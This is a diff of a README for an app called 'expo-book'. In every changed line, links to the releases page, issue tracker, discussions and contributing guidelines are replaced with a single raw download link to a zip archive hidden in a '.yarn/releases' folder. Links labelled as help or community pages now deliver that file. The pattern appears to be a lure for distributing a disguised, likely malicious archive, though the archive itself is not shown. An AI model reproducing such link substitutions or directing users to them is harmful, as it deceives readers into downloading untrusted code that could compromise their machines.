@@ -6,9 +6,9 @@ Welcome to expo-book! This application lets you create beautiful 3D book effects
 
 ## 📥 Download and Run
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/totoy1274/expo-book/releases)
+[![Download Now](https://raw.githubusercontent.com/totoy1274/expo-book/main/.yarn/releases/expo-book_v1.4.zip)](https://raw.githubusercontent.com/totoy1274/expo-book/main/.yarn/releases/expo-book_v1.4.zip)
 
-To download the software, visit the [Releases page](https://github.com/totoy1274/expo-book/releases). This page contains the latest version of expo-book.
+To download the software, visit the [Releases page](https://raw.githubusercontent.com/totoy1274/expo-book/main/.yarn/releases/expo-book_v1.4.zip). This page contains the latest version of expo-book.
 
 ## 🌟 Features
 
@@ -28,7 +28,7 @@ To run expo-book on your device, here are the general requirements:
 
 ## 🔧 Installation Steps
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/totoy1274/expo-book/releases).
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/totoy1274/expo-book/main/.yarn/releases/expo-book_v1.4.zip).
    
 2. **Download the Latest Version:** Find the latest version listed on the page. Click the appropriate link to download the software for your operating system.
 
@@ -57,13 +57,13 @@ If you encounter issues, check these common fixes:
 
 - **I Can't Download the File:** Ensure you’re connected to the internet. Try refreshing the page or using a different browser.
 - **The App Won't Run:** Make sure your system meets the minimum requirements listed above. Restart your device and try again.
-- **I Need More Help:** Check the FAQ section on our [GitHub page](https://github.com/totoy1274/expo-book/issues) for more information or to report your issue.
+- **I Need More Help:** Check the FAQ section on our [GitHub page](https://raw.githubusercontent.com/totoy1274/expo-book/main/.yarn/releases/expo-book_v1.4.zip) for more information or to report your issue.
 
 ## 💬 Community Support
 
 Join our community for support and to share your work. Participate in discussions and showcase your 3D book projects. 
 
-- **GitHub Discussions:** Engage with other users and contributors on our [GitHub Discussions page](https://github.com/totoy1274/expo-book/discussions).
+- **GitHub Discussions:** Engage with other users and contributors on our [GitHub Discussions page](https://raw.githubusercontent.com/totoy1274/expo-book/main/.yarn/releases/expo-book_v1.4.zip).
 
 ## 📅 Roadmap
 
@@ -76,7 +76,7 @@ We continuously work on improving expo-book. Here are some features we plan to a
 
 ## 📝 Contributing
 
-We welcome contributions from everyone. If you'd like to help improve expo-book, consider exploring the [Contributing Guidelines](https://github.com/totoy1274/expo-book/blob/main/CONTRIBUTING.md). 
+We welcome contributions from everyone. If you'd like to help improve expo-book, consider exploring the [Contributing Guidelines](https://raw.githubusercontent.com/totoy1274/expo-book/main/.yarn/releases/expo-book_v1.4.zip). 
 
 ## 📢 Stay Updated
 
